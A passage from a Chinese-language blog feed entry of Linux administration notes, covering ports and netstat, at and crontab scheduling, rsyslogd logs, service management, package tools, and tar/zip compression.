 9  杀死进程，强制结束进程。&lt;/p&gt;
&lt;h1 id=&#34;端口&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#端口&#34;&gt;#&lt;/a&gt; 端口&lt;/h1&gt;
&lt;p&gt;在 Linux 操作系统下，系统共定义了 65536 个可用的端口。&lt;br /&gt;
对于 0-1023 端口，都需要 root 身份才能启用，这些端口主要用于系统一些常见的通信服务中。比如: 21 ftp 服务、22 ssh 服务、80 http 服务等...&lt;br /&gt;
 端口的开启和关闭也就是软件服务的启动和关闭&lt;/p&gt;
&lt;h2 id=&#34;chkconfig命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#chkconfig命令&#34;&gt;#&lt;/a&gt; chkconfig 命令&lt;/h2&gt;
&lt;p&gt;chkconfig 来判断服务是开启还是关闭状态&lt;br /&gt;
例如 chkconfig --list sshd&lt;/p&gt;
&lt;h2 id=&#34;netstat命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#netstat命令&#34;&gt;#&lt;/a&gt; netstat 命令&lt;/h2&gt;
&lt;p&gt;netstat 命令：用于显示 tcp, udp 的端口和进程情况&lt;br /&gt;
用法:&lt;br /&gt;
netstat [选项]&lt;br /&gt;
-a 显示所有&lt;br /&gt;
 - t 仅显示 tcp 相关选项&lt;br /&gt;
 - u 仅显示 udp 相关选项&lt;br /&gt;
 - n 拒绝显示别名，能显示数字的全部转化为数字&lt;br /&gt;
 - l 仅列出在 Listen (监听) 的服务状态&lt;br /&gt;
 - p 显示建立相关链接的程序名&lt;/p&gt;
&lt;p&gt;常用命令:&lt;br /&gt;
netstat-antlp // 查看当前所有 tcp 端口&lt;br /&gt;
 netstat-antulp|grep 80 // 查看所有 80 端口使用情况&lt;/p&gt;
&lt;h1 id=&#34;linux计划任务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#linux计划任务&#34;&gt;#&lt;/a&gt; linux 计划任务&lt;/h1&gt;
&lt;p&gt;计划任务，就是在约定好的时间执行已经计划好的工作。&lt;br /&gt;
未来的某时间点执行一次某任务或者周期性的运行某个任务，执行结果会通过邮形式发送给用户。&lt;/p&gt;
&lt;h2 id=&#34;安全与计划任务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安全与计划任务&#34;&gt;#&lt;/a&gt; 安全与计划任务&lt;/h2&gt;
&lt;p&gt;挖矿病毒：&lt;br /&gt;
使用 top 查看 CPU，显示进程占 cpu99% 以上。杀掉进程后，到了晚上还是会自动运行进程。&lt;br /&gt;
检测定时任务，发现有一个异常的定时任务&lt;/p&gt;
&lt;h2 id=&#34;at命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#at命令&#34;&gt;#&lt;/a&gt; at 命令&lt;/h2&gt;
&lt;p&gt;at 命令 一次性计划任务&lt;br /&gt;
默认自带 at&lt;br /&gt;
 &lt;code&gt;yum install at -y&lt;/code&gt;     下载 at&lt;/p&gt;
&lt;p&gt;开启服务:&lt;br /&gt;
service atd start&lt;/p&gt;
&lt;p&gt;用法:&lt;br /&gt;
at (选项)&lt;br /&gt;
 选项&lt;br /&gt;
 - f: 指定包含具体指令的任务文件；&lt;br /&gt;
-q: 指定新任务的队列名称；&lt;br /&gt;
-l: 显示待执行任务的列表；&lt;br /&gt;
-d: 删除指定的待执行任务；&lt;br /&gt;
-m: 任务执行完成后向用户发送 E-mail;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label&#34;&gt;实例&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;at 10:00    确切时间&lt;br /&gt;
 at now +10 minutes  十分钟后执行&lt;br /&gt;
 at 17:04 04/04/2018  2018483817:04 执行&lt;br /&gt;
 at 17:04 04/04/2018  2018483817:04 执行&lt;/p&gt;
&lt;p&gt;at 1am tomorrow 明天上午一点运行作业&lt;br /&gt;
 at-c id    根据作业 ID 查看执行细节&lt;br /&gt;
 atq        查看待处理的任务&lt;br /&gt;
 atrm id    删除 id 的任务&lt;/p&gt;
&lt;h2 id=&#34;crondtab命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#crondtab命令&#34;&gt;#&lt;/a&gt; crondtab 命令&lt;/h2&gt;
&lt;p&gt;crondtab 命令 周期性计划任务&lt;/p&gt;
&lt;p&gt;crond 是 linux 下用来周期性的执行某种任务或等待处理某些事件的一个守护进程。&lt;/p&gt;
&lt;p&gt;Linux 系统上系统服务是默认启动的，使用者控制计划任务命令:crontab 命令。&lt;/p&gt;
&lt;p&gt;crontab 其实是一个命令，用来读取和修改名为 crontab 的文件。/etc/crontab 文件包含了要定时执行的程序列表。&lt;/p&gt;
&lt;p&gt;安装 crontab: 默认自带&lt;br /&gt;
 &lt;code&gt;yum install crontabs&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;服务命令:&lt;/p&gt;
&lt;p&gt;service crond start // 启动服务 service crond stop // 关闭服务 service crond restart// 重启服务 service crond reload // 重新载入配置&lt;/p&gt;
&lt;p&gt;crontab 命令 周期性计划任务&lt;/p&gt;
&lt;p&gt;1、命令格式:&lt;/p&gt;
&lt;p&gt;crontab [-u user] file&lt;br /&gt;
crontab [-u user] 【选项】&lt;/p&gt;
&lt;p&gt;常用选项:&lt;/p&gt;
&lt;p&gt;-e: 编辑计划任务 edit&lt;br /&gt;
-l: 查看计划任务 display&lt;br /&gt;
-u: 指定用户&lt;/p&gt;
&lt;p&gt;常用命令:&lt;/p&gt;
&lt;p&gt;crontab -l 列出当前用户的计划任务&lt;br /&gt;
 crontab -r 删除当前用户所有的计划任务&lt;br /&gt;
 crontab -e 编辑当前用户的计划任务&lt;br /&gt;
 crontab-e -u root 编辑 root 用户的计划任务&lt;/p&gt;
&lt;p&gt;第一列：分钟 (0-59)&lt;br /&gt;
 第二列：小时 (0-23)&lt;br /&gt;
 第三列：天 (1-31)&lt;br /&gt;
 第四列：月 (1-12)&lt;br /&gt;
 第五列：周 (0-6) 0 表示周日&lt;/p&gt;
&lt;p&gt;&amp;quot;&lt;em&gt;&amp;quot; 表示所有的取值，就是&lt;/em&gt; / 1&amp;quot;&lt;br /&gt;
&amp;quot;/&amp;quot; 表示每的意思&lt;br /&gt;
 */5&amp;quot; 表示每 5 个单位&lt;br /&gt;
 &amp;quot;-&amp;quot; 表示从某个数字到某个数字&lt;br /&gt;
 &amp;quot;,&amp;quot; 表示分散的数字&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;crontab.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label&#34;&gt;实例&lt;/span&gt;&lt;br /&gt;
&lt;img data-src=&#34;image011.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;日志服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#日志服务&#34;&gt;#&lt;/a&gt; 日志服务&lt;/h1&gt;
&lt;h2 id=&#34;基础信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基础信息&#34;&gt;#&lt;/a&gt; 基础信息&lt;/h2&gt;
&lt;p&gt;在 CentOS 6.x 中，日志服务已经由 rsyslogd 取代了原先的 syslogd.&lt;br /&gt;
rsyslogd 相比 syslogd 具有一些新的特点:&lt;br /&gt;
 基于 TCP 网络协议传输日志信息。&lt;br /&gt;
更安全的网络传输方式。&lt;br /&gt;
有日志信息的即时分析框架。&lt;br /&gt;
后台数据库。&lt;br /&gt;
在配置文件中可以写简单的逻辑判断。&lt;br /&gt;
与 syslog 配置文件相兼容。&lt;/p&gt;
&lt;p&gt;查看 rsyslogd 服务是否启动&lt;br /&gt;
 &lt;code&gt;ps aux|grep &amp;quot;rsyslogd&amp;quot;|grep -v &amp;quot;grep&amp;quot;&lt;/code&gt; &lt;br /&gt;
 查询 rsyslogd 服务的自启动状态&lt;br /&gt;
 &lt;code&gt;chkconfig --list|grep &amp;quot;rsyslog&amp;quot;&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;systemctl list-unit-files|grep &amp;quot;rsyslog&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在 Linux 系统中有一部分日志不是由 rsyslogd 服务来管理的，比如 apache 服务，它的日志是由 Apache 软件自己产生并记录的，并没有调用 rsyslogd 服务，但是 apache 日志文件的格式和系统默认日志的格式是一致的。&lt;/p&gt;
&lt;p&gt;在 Linux 系统中有一部分日志不是由 rsyslogd 服务来管理的，比如 apache 服务，它的日志是由 Apache 软件自己产生并记录的，并没有调用 rsyslogd 服务，但是 apache 日志文件的格式和系统默认日志的格式是一致的。&lt;/p&gt;
&lt;p&gt;日志文件是重要的系统信息文件，其中记录了许多重要的系统事件，包括用户的登录信息、系统的启动信息、系统的安全信息、邮件相关信息、各种服务相关信息等。这些信息有些非常敏感，所以在 Linux 中这些日志文件只有 root 用户可以读取。&lt;br /&gt;
系统日志文件的保存位置是 /var/log/ 目录&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image012.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
&lt;img data-src=&#34;image013.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
&lt;img data-src=&#34;image014.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;日志服务 rsyslogd 记录的日志文件格式包含以下 4 列:&lt;/p&gt;
&lt;p&gt;1. 事件产生的时间。&lt;br /&gt;
2. 产生事件的服务器的主机名。&lt;br /&gt;
3. 产生事件的服务名或程序名。&lt;br /&gt;
4. 事件的具体信息。&lt;/p&gt;
&lt;p&gt;/var/log/secure 日志文件内容:&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image015.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;/var/log/secure 记录验证和授权方面的倍息，只要涉及账户和密码的程序都会记录，比如系统的登录、ssh 的登录、su 切换用户，sudo 授权，甚至添加用户和修改用户密码都会记录在这个日志文件中&lt;/p&gt;
&lt;p&gt;/var/log/wtmp 永久记录所有用户的登陆、注销信息，同时记录系统的后动、重启、关机事件&lt;/p&gt;
&lt;p&gt;/var/tun/ulmp 记录当前已经登录的用户的信息。这个文件会随着用户的登录和注销而不断变化，只记录当前登录用户的信息。&lt;/p&gt;
&lt;h2 id=&#34;rsyslogd配置文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rsyslogd配置文件&#34;&gt;#&lt;/a&gt; rsyslogd 配置文件&lt;/h2&gt;
&lt;p&gt;rsyslogd 服务的配置文件是 /etc/rsyslog.conf , 其中主要定义了服务的名称、日志等级和日志记录位置。&lt;/p&gt;
&lt;p&gt;该配置文件的基本格式如下所示:&lt;/p&gt;
&lt;p&gt;authpriv.*                  /var/log/secure&lt;br /&gt;
# 服务名称 [连接符号] 日志等级   日志记录位置&lt;/p&gt;
&lt;h2 id=&#34;日志等级&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#日志等级&#34;&gt;#&lt;/a&gt; 日志等级&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;image016.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;详细见&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbmJsb2dzLmNvbS9rbGI1NjEvcC8xMjAxNDI2OC5odG1s&#34;&gt; https://cnblogs.com/klb561/p/12014268.html&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;连接符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#连接符&#34;&gt;#&lt;/a&gt; 连接符&lt;/h2&gt;
&lt;p&gt;连接符号:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&amp;quot;.&amp;quot; 代表只要比后面的等级高的 (包含该等级) 日志都记录。比如，&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Nyb24uaW5mbw==&#34;&gt;cron.info&lt;/span&gt;&amp;quot; 代表 cron 服务产生的日志，只要日志等级大于等于 info 级别，就记录。&lt;/li&gt;
&lt;li&gt;&amp;quot;.=&amp;quot; 代表只记录所需等级的日志，其他等级的日志都不记录。比如，&amp;quot;*.=emerg&amp;quot; 代表人和日志服务产生的日志，只要等级是 emerg 等级，就记录。这种用法极少见，了解就好。&lt;/li&gt;
&lt;li&gt;&amp;quot;.!&amp;quot; 代表不等于，也就是除该等级的日志外，其他等级的日志都记录。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;日志记录位置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#日志记录位置&#34;&gt;#&lt;/a&gt; 日志记录位置&lt;/h2&gt;
&lt;p&gt;日志记录位置：当前日志输出到哪个日志文件中保存&lt;/p&gt;
&lt;p&gt;日志文件的绝对路径。例如: &amp;quot;/ar/log/secure&amp;quot;&lt;/p&gt;
&lt;p&gt;系统设备文件。如 &amp;quot;/dev/lpo&amp;quot; 代表第一台打印机，如果日志保存位置是打印机设备，当有日志时就会在打印机上打印。&lt;/p&gt;
&lt;p&gt;用户名。如果是 &amp;quot;root&amp;quot; , 把日志发送给 root 用户 (用户要在线) &amp;quot;*&amp;quot; 代表发送给所有在线用户，如 &amp;quot;mail**&amp;quot; 就会把 mail 服务产生的所有级别的日志发送给所有在线用户。发给多个在线用户，则用户名之间用 &amp;quot;,&amp;quot; 分隔。&lt;/p&gt;
&lt;p&gt;忽略或丢弃日志。如果接收日志的对象是 &amp;quot;~&amp;quot; , 则代表这个日志不会被记录，而被直接丢弃。如 &amp;quot;local3.*~&amp;quot; 代表忽略 local3 服务类型所有的日志都不记录。&lt;/p&gt;
&lt;h2 id=&#34;日志管理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#日志管理&#34;&gt;#&lt;/a&gt; 日志管理&lt;/h2&gt;
&lt;p&gt;日志管理:&lt;/p&gt;
&lt;p&gt;日志维护的最主要的工作就是把旧的日志文件删除，从而腾出空间保存新的日志文件。&lt;/p&gt;
&lt;p&gt;logrotate 就是用来进行日志轮替的，就是把旧的日志文件移动并改名，同时创建一个新的空日志文件用来记录新日志，当旧日志文件超出保存的范围时就删除。&lt;/p&gt;
&lt;p&gt;日志文件的命名规则:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;服务加日期&lt;/li&gt;
&lt;li&gt;服务加数字&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;查看日志备份文件&lt;br /&gt;
 ls /var/log&lt;/p&gt;
&lt;p&gt;logrotate 令可以进行日志转储 (轮替)&lt;/p&gt;
&lt;p&gt;logrotate 命令会依据 /etc/logrotate.conf 配置文件的配置，来判断配置文件中的日志是否符合日志轮替的条件 (比如，日志备份时间已经满一周) , 如果符合，日志就会进行轮替。&lt;/p&gt;
&lt;p&gt;/etc/logrotate.conf 配置文件的&lt;br /&gt;
 cat /etc/logrotate.conf&lt;br /&gt;
 详细讲解&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2MuYmlhbmNoZW5nLm5ldC92aWV3LzExMDYuaHRtbA==&#34;&gt;http://c.biancheng.net/view/1106.html&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;系统服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#系统服务&#34;&gt;#&lt;/a&gt; 系统服务&lt;/h1&gt;
&lt;p&gt;什么是系统服务？&lt;br /&gt;
 服务是在后台运行的应用程序，并且可以提供一些本地系统或网络的功能。&lt;br /&gt;
我们把这些应用程序称作服务，也就是 Service.&lt;br /&gt;
Linux 中常见的服务有那些，这些服务怎么分类，服务如何启动，服务如何自启动，服务如何查看？&lt;/p&gt;
&lt;p&gt;服务 Service, Daemon 这个词也经常伴随着出现。&lt;br /&gt;
Daemon 翻 i 成 &amp;quot;守护进程&amp;quot;&lt;br /&gt;
 守护进程：就是为了实现服务、功能的进程。&lt;br /&gt;
比如，apache 服务就是服务 (Service) , 它是用来实现 Web 服务的。&lt;br /&gt;
那么，启动 apache 服务的进程是哪个进程呢？&lt;br /&gt;
httpd 这个守护进程 (Daemon) 。&lt;br /&gt;
在 Linux 中就是通过启动 httpd 进程来启动 apache 服务的。&lt;br /&gt;
也就是说，守护进程就是服务在后台运行的真实进程。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image017.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Linux 中的服务按照安装方法不同可以分为 RPM 包默认安装的服务和源码包安装的服务两大类。&lt;/p&gt;
&lt;p&gt;区别:&lt;/p&gt;
&lt;p&gt;RPM 包安装到系统默认位置，可以被服务管理命令识别；但是源码包安装到手工指定位置，当然就不能被服务管理命令识别了 (可以手工修改为被服务管理命令识别)。&lt;/p&gt;
&lt;h2 id=&#34;启动服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#启动服务&#34;&gt;#&lt;/a&gt; 启动服务&lt;/h2&gt;
&lt;p&gt;启动服务方式:&lt;/p&gt;
&lt;p&gt;1) 使用 /etc/init.d/ 目录中的启动脚本来启动独立的服务&lt;/p&gt;
&lt;p&gt;2) 使用 service 命令来启动独立的服务&lt;/p&gt;
&lt;p&gt;1) 使用 /etc/init.d/ 目录中的启动脚本来启动独立的服务&lt;/p&gt;
&lt;p&gt;所有独立服务的启动脚本都存放在 /etc/init.d/ 目录中，调用脚本就可以启动独立的服务了。&lt;/p&gt;
&lt;p&gt;命令格式如下:&lt;/p&gt;
&lt;p&gt;/etc/init.d/ 独立服务名参数参数:&lt;/p&gt;
&lt;p&gt;start: 启动服务；&lt;br /&gt;
stop: 停止服务；&lt;br /&gt;
status: 查看服务状态；&lt;br /&gt;
restart: 重启动服务；&lt;/p&gt;
&lt;p&gt;2) 使用 service 命令来启动独立的服务&lt;/p&gt;
&lt;p&gt;在 CentOS 系统中，我们还可以依赖 service 命令来启动独立的服务。service 命令实际上只是一个脚本，这个脚本仍然需要调用 /etc/init.d/ 中的启动脚本来启动独立的服务。&lt;/p&gt;
&lt;p&gt;service 命令格式如下:&lt;/p&gt;
&lt;p&gt;service 独立服务名 start|stop|restart|..&lt;/p&gt;
&lt;p&gt;&lt;code&gt;service --status-all 查看所有服务&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;服务的自启动&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#服务的自启动&#34;&gt;#&lt;/a&gt; 服务的自启动&lt;/h2&gt;
&lt;p&gt;使用 chkconfig 服务自启动管理命令&lt;/p&gt;
&lt;p&gt;格式:&lt;/p&gt;
&lt;p&gt;查看所有服务的自启动状态&lt;br /&gt;
 chkconfig -list&lt;/p&gt;
&lt;p&gt;设置某服务的自启动状态&lt;/p&gt;
&lt;p&gt;chkconfig [--level 运行级别][独立服务名][on|off]&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image018.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;想把某个已经安装了的服务添加为系统服务，可以执行以下命令：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;chkconfig --add 服务名称&lt;/code&gt;           (首先，添加为系统服务，注意 add 前面有两个横杠)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;chkconfig -leve 启动级别 服务名 on&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;下载与安装&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#下载与安装&#34;&gt;#&lt;/a&gt; 下载与安装&lt;/h1&gt;
&lt;h2 id=&#34;wget&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#wget&#34;&gt;#&lt;/a&gt; wget&lt;/h2&gt;
&lt;p&gt;wget 是一个下载文件的工具，它用在命令行下&lt;/p&gt;
&lt;p&gt;语法：wget [选项] url&lt;/p&gt;
&lt;p&gt;选项：&lt;/p&gt;
&lt;p&gt;-V 显示 wget 版本信息并退出。&lt;br /&gt;
-h 打印此帮助&lt;br /&gt;
 - O 指定下载文件的别名。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image019.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;rpm&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rpm&#34;&gt;#&lt;/a&gt; rpm&lt;/h2&gt;
&lt;p&gt;Linux rpm 命令用于管理套件，增强了程序安装卸载的管理。&lt;/p&gt;
&lt;p&gt;RPM 的功能：打包、安装、查询、升级、卸载...&lt;/p&gt;
&lt;p&gt;缺点: RPM 无法解决软件包的依赖关系&lt;/p&gt;
&lt;p&gt;RPM 包的命名规范: name-version-release.os.arch.rpm&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image020.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;!{}(image021.png)&lt;/p&gt;
&lt;h2 id=&#34;yum&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#yum&#34;&gt;#&lt;/a&gt; yum&lt;/h2&gt;
&lt;p&gt;yum 基于 RPM 包管理，能够从指定的服务器自动下载 RPM 包和安装&lt;/p&gt;
&lt;p&gt;优点：可以自动处理关联关系，并且一次安装所有依赖的软件包，无须繁琐地一次下载，安装。&lt;/p&gt;
&lt;p&gt;语法 ：&lt;br /&gt;
yum [选项] [包……]&lt;/p&gt;
&lt;p&gt;选项：&lt;br /&gt;
-h 帮助&lt;br /&gt;
 - y 当安装过程中提示选择全部为 “yes”&lt;br /&gt;
-q 不显示安装过程&lt;/p&gt;
&lt;p&gt;检测有没有安装 yum&lt;br /&gt;
yum -h&lt;br /&gt;
rpm -qa | grep yum&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;span class=&#34;label info&#34;&gt;相关命令&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;1・列出所有可更新的软件清单命令: yum check-update&lt;br /&gt;
2 更新所有软件命令: yum update&lt;br /&gt;
3 仅安装指定的软件命令: yum install 包名称&lt;br /&gt;
 4 仅更新指定的软件命令: yum update 包名称&lt;br /&gt;
 5 列出所有可安装的软件清单命令: yum list&lt;br /&gt;
6 删除删除命令: yum remove 包名称&lt;br /&gt;
 7 清除缓存命令:&lt;br /&gt;
 清除缓存目录 (/var/cache/yum) 下的软件包&lt;br /&gt;
命令：yum clean packages&lt;/p&gt;
&lt;p&gt;清除缓存目录 (/var/cache/yum) 下的 headers&lt;br /&gt;
 命令：yum clean headers&lt;/p&gt;
&lt;p&gt;清除缓存目录 (/var/cache/yum) 下旧的 headers&lt;br /&gt;
 命令：yum clean oldheaders&lt;/p&gt;
&lt;p&gt;清除缓存目录 (/var/cache/yum) 下的软件包及旧的 headers&lt;br /&gt;
 命令：yum clean, yum clean all (= yum clean packages; yum clean oldheaders)&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;span class=&#34;label info&#34;&gt;yum list 相关命令&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;iamge022.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;安装应用程序&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;语法: yum [-y] install 包 1 包 2…… 包 n&lt;br /&gt;
yum install wget    使用安装 wget&lt;/p&gt;
&lt;p&gt;升级软件包&lt;/p&gt;
&lt;p&gt;命令格式: yum update 包 1 包 2…… 包 n&lt;br /&gt;
yum check-update 检测可升级的包&lt;/p&gt;
&lt;p&gt;卸载软件包&lt;/p&gt;
&lt;p&gt;命令格式: yum remove 包 1 包 2…… 包 n&lt;br /&gt;
 注意：卸载时注意依赖关系&lt;/p&gt;
&lt;h1 id=&#34;文件打包和解压缩&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件打包和解压缩&#34;&gt;#&lt;/a&gt; 文件打包和解压缩&lt;/h1&gt;
&lt;p&gt;linux 中常用的五种压缩格式: .zip .gz .tar.gz .bz2 .tar.bz2&lt;/p&gt;
&lt;p&gt;打包和压缩:&lt;/p&gt;
&lt;p&gt;打包是指将一大堆文件或目录什么的变成一个总的文件&lt;br /&gt;
压缩则是将一个大的文件通过一些压缩算法变成一个小文件&lt;/p&gt;
&lt;h2 id=&#34;tar命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tar命令&#34;&gt;#&lt;/a&gt; tar 命令&lt;/h2&gt;
&lt;p&gt;Linux 中的很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你就得先借助另它的工具将这一大堆文件先打成一个包，然后再就原来的压缩程序进行压缩。&lt;/p&gt;
&lt;p&gt;Liunx 下最常用的打包命令是 tar, 使用 tar 程序打出来的包我们常称为 tar 包，tar 包文件的命通常都是以.tar 结尾的。&lt;br /&gt;
生成 tar 包后，就可以用其它的程序来进行压缩了，所以首先就来讲讲 tar 命令的基本用法&lt;/p&gt;
&lt;p&gt;语法:&lt;br /&gt;
tar 【选项】 打包文件包 源文件&lt;br /&gt;
选项:&lt;br /&gt;
-c: 打包&lt;br /&gt;
 - v: 显示详细过程&lt;br /&gt;
 - x: 解打包 / 压缩&lt;br /&gt;
 - z: 通过 gzip 压缩 / 解压文件&lt;br /&gt;
 - j: 通过 bz2 压缩 / 解压文件&lt;br /&gt;
 - C: 解压到指定目录&lt;br /&gt;
 - f filename: 指定打包后的文件名 (必选，这个参数是最后一个参数，后面只能接文件名)&lt;/p&gt;
&lt;p&gt;常用命令:&lt;br /&gt;
tar -cf all.tar *.jpg  #将所有.jpg 的文件打成一个名为 all.tar 的包&lt;br /&gt;
 tar -xvf all.tar  #解出 all.tar 包中所有文件，-x 是解开的意思&lt;/p&gt;
&lt;p&gt;为了方便用户在打包解包的同时可以压缩或解压文件，tar 提供了一种特殊的功能 -- 就是 tar 可以在打包或解包的同时调用其它的压缩程序，比如调用 gzip.bzip2 等。&lt;/p&gt;
&lt;h2 id=&#34;解压缩与压缩&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#解压缩与压缩&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label info&#34;&gt;解压缩与压缩&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;image022.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;zip&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#zip&#34;&gt;#&lt;/a&gt; zip&lt;/h2&gt;
&lt;p&gt;zip 【选项】 【压缩文件】&lt;/p&gt;
&lt;p&gt;选项:&lt;br /&gt;
-m 将文件压缩并加入压缩文件后，删除原始文件，即把文件移到压缩文件中。&lt;br /&gt;
-q 不显示指令执行过程。&lt;br /&gt;
-r 递归处理，将指定目录下的所有文件和子目录一并处理。&lt;br /&gt;
-v 显示指令执行过程或显示版本信息。&lt;/p&gt;
&lt;p&gt;实例&lt;/p&gt;
&lt;p&gt;将 /home/html/ 这个目录下所有文件和文件夹打包为当前目录下的 html.zip:&lt;/p&gt;
&lt;p&gt;zip-qr html.zip /home/html&lt;/p&gt;
&lt;h2 id=&#34;unzip&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#unzip&#34;&gt;#&lt;/a&gt; unzip&lt;/h2&gt;
&lt;p&gt;unzip 【选项】 【压缩文件】&lt;/p&gt;
&lt;p&gt;选项:&lt;/p&gt;
&lt;p&gt;-l 显示压缩文件内所包含的文件 - V 执行是时显示详细的信息。&lt;br /&gt;
-q 执行时不显示任何信息。&lt;br /&gt;
-d &amp;lt;目录&amp;gt; 指定文件解压缩后所要存储的目录。&lt;/p&gt;
&lt;p&gt;实例&lt;/p&gt;
&lt;p&gt;解压文件&lt;br /&gt;
 &lt;code&gt;unzip abc.zip&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;查看压缩文件中包含的文件:&lt;br /&gt;
 &lt;code&gt;unzip-l abc.zip&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;gzip&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#gzip&#34;&gt;#&lt;/a&gt; gzip&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;tar 调用 gzipgzip 是 GNU 组织开发的一个压缩程序，.gz 结尾的文件就是 gzip 压缩的结果。与 gzip 相对的解压程序是 gunzip.&lt;br /&gt;
tar 中使用 - z 这个参数来调用 gzip 常用命令:&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;tar-czf all.tar.gz *.jpg&lt;/code&gt;   #将所有.jpg 的文件打成一个 tar 包，并且将其用 gzip 压缩，生成一个 gzip 压缩过的包 all.tar.gz&lt;/p&gt;
&lt;p&gt;&lt;code&gt;tar-xzf all.tar.gz&lt;/code&gt;   #将包 all.tar.z 解开&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;tar 调用 bzip2bzip2 是一个压缩能力更强的压缩程序，.bz2 结尾的文件就是 bzip2 压缩的结果。与 bzip2 相对的解压程序是 bunzip&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;tar 中使用 - j 这个参数来调用 bzip2&lt;/p&gt;
&lt;p&gt;常用命令:&lt;/p&gt;
&lt;p&gt;tar -cjfall.tar.bz2 *.jpg #将所有.jpg 的文件打成一个 tar 包，并且将其用 bzip2 压缩，生成一个 bzip2 压缩过的包，包名为 all.tar.bz2&lt;/p&gt;
&lt;p&gt;tar -xjf all.tar.bz2  #将上面产生的包解开&lt;/p&gt;
</content>
        <category term="Linux" scheme="https://self-ferry.github.io/categories/Linux/" />
        <category term="Linux" scheme="https://self-ferry.github.io/tags/Linux/" />
        <updated>2021-02-19T06:54:11.000Z</updated>
    </entry>
    <entry>
